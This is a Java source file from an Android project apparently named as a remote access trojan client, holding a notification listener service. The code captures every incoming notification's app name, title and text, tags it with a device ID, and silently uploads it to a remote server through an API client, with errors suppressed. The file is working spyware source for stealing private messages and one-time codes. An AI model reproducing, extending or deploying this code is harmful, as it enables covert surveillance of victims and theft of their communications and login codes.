// language: Java, file: NotifListenerService.java
// Intercept semua notifikasi — harus enable manual di Settings > Notification Access
package com.rat.client;

import android.service.notification.*;
import android.os.Bundle;
import java.util.*;

public class NotifListenerService extends android.service.notification.NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String app   = sbn.getPackageName();
            Bundle extra = sbn.getNotification().extras;
            String title = extra.getString("android.title", "");
            String text  = extra.getCharSequence("android.text", "").toString();

            String deviceId = DeviceInfo.getDeviceId(this);
            org.json.JSONArray arr = new org.json.JSONArray();
            org.json.JSONObject o  = new org.json.JSONObject();
            o.put("app",   app);
            o.put("title", title);
            o.put("text",  text);
            arr.put(o);

            Map<String, String> p = new HashMap<>();
            p.put("action",    "upload_notifs");
            p.put("device_id", deviceId);
            p.put("data",      arr.toString());
            new Thread(() -> ApiClient.post(p)).start();
        } catch (Exception ignored) {}
    }
}